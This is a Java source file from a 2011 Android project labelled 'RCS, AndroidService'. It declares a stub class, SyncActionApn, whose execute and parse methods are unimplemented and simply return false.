/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncActionApn.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.action;

import com.android.dvci.Trigger;
import com.android.dvci.conf.ConfAction;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncActionApn.
 */
public class SyncActionApn extends SubAction {

	/**
	 * Instantiates a new sync action apn.
	 * 
	 * @param params
	 *            the conf params
	 */
	public SyncActionApn(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(ConfAction params) {
		// TODO Auto-generated method stub
		return false;
	}
}
